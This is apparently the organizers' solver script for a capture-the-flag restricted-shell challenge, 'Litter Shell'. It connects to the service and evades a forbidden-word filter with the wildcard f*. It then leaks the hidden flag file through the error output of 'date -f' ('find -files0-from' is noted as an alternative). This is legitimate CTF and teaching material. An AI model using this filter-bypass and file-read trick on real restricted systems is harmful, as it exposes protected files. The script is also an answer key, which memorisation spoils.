#!/usr/bin/env python3
"""
Litter Shell - solver (organizers only, do NOT ship to players).

1. `ls -a /srv` / `find /srv -type f` reveal /srv/.litter/flag.txt
2. "flag" is a forbidden word, but the wildcard f* is expanded AFTER the check
3. `date -f FILE` reads dates from FILE and prints every line it can't parse:
       date: invalid date 'SecurinetsENIT{...}'
   (`find -files0-from FILE` leaks it the same way)

Usage:
    python3 solve.py [host] [port]      # default localhost 1345
"""
import re
import socket
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 1345

s = socket.create_connection((host, port), timeout=10)
buf = ""
while "$ " not in buf:
    buf += s.recv(4096).decode(errors="replace")
s.sendall(b"date -f /srv/.litter/f*\nexit\n")
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    buf += chunk.decode(errors="replace")
m = re.search(r"SecurinetsENIT\{[^}]*\}", buf)
print(m.group(0) if m else buf)
